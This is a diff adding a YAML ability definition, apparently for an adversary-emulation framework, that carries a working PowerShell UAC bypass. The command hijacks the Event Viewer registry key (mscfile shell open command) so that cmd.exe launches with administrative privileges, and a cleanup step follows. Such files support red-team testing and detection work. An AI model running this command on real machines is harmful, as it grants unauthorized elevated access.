@@ -1,0 +1,25 @@
+---
+- id: 7440c68b83b6d728b4111d083facefec
+  name: Bypass UAC using Event Viewer (PowerShell)
+  description: 'PowerShell code to bypass User Account Control using Event Viewer
+    and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+    Upon execution command prompt should be launched with administrative privalages
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      psh:
+        command: New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force;
+          Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name
+          "(default)" -Value "C:\Windows\System32\cmd.exe" -Force; Start-Process "C:\Windows\System32\eventvwr.msc"
+        payloads: []
+        cleanup: Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction
+          Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
